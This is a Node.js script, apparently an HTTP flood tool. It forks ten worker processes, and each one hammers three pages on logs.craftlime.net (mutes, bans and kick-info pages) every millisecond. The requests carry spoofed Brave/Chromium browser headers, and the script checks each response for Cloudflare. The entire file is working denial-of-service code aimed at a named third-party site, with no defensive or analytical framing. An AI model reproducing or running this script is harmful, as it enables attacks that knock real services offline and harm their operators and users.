const fetch = (...args) =>
  import("node-fetch").then(({ default: fetch }) => fetch(...args));
const cluster = require("cluster");
const main = cluster.isMaster;

const threads = 10;
const delay = 1;

let integrator = 0;

if (isNaN(threads) || threads === 0) {
  console.log("threads should be a number greater than 0, edit config.json");
  return process.exit(1);
}
if (isNaN(delay)) {
  console.log("delay should be a number, edit config.json");
  return process.exit(1);
}

if (main) {
  for (let i = 0; i < threads; i++) {
    const worker = cluster.fork({ id: i + 1 });
    worker.on("message", (msg) => {
      integrator = integrator + 1;
      console.log(msg);
      console.log(integrator);
    });
  }
  cluster.on("exit", (worker, code, sig) => {
    console.error(
      "The Thread with the " +
        worker.process.pid +
        "exited with the code: " +
        code,
    );
  });
} else {
  console.log(
    `Worker with the process id: ${process.pid} and id: ${process.env.id} has been started.`,
  );
  setInterval(() => {
    fetch("https://logs.craftlime.net/mutes.php", {
      headers: {
        accept:
          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.6",
        "cache-control": "max-age=0",
        "sec-ch-ua":
          '"Chromium";v="118", "Brave";v="118", "Not=A?Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Linux"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "none",
        "sec-fetch-user": "?1",
        "sec-gpc": "1",
        "upgrade-insecure-requests": "1",
      },
      referrerPolicy: "strict-origin-when-cross-origin",
      body: null,
      method: "GET",
      mode: "cors",
      credentials: "omit",
    })
      .then((res) => res.text())
      .then((data) => {
        if (data.includes("Cloudflare")) process.send("cloudflare");
        else process.send(data);
      })
      .catch((error) => process.send(error));
    fetch("https://logs.craftlime.net/bans.php", {
      headers: {
        accept:
          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.6",
        "sec-ch-ua":
          '"Chromium";v="118", "Brave";v="118", "Not=A?Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Linux"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "sec-gpc": "1",
        "upgrade-insecure-requests": "1",
      },
      referrer: "https://logs.craftlime.net/kicks.php",
      referrerPolicy: "strict-origin-when-cross-origin",
      body: null,
      method: "GET",
      mode: "cors",
      credentials: "omit",
    })
      .then((res) => res.text())
      .then((data) => {
        if (data.includes("Cloudflare")) process.send("cloudflare");
        else process.send(data);
      })

      .catch((error) => process.send(error));
    fetch("https://logs.craftlime.net/info.php?type=kick&id=42890", {
      headers: {
        accept:
          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.6",
        "sec-ch-ua":
          '"Chromium";v="118", "Brave";v="118", "Not=A?Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Linux"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "sec-gpc": "1",
        "upgrade-insecure-requests": "1",
      },
      referrer: "https://logs.craftlime.net/kicks.php",
      referrerPolicy: "strict-origin-when-cross-origin",
      body: null,
      method: "GET",
      mode: "cors",
      credentials: "omit",
    })
      .then((res) => res.text())
      .then((data) => {
        if (data.includes("Cloudflare")) process.send("cloudflare");
        else process.send(data);
      })

      .catch((error) => process.send(error));
  }, delay);
}
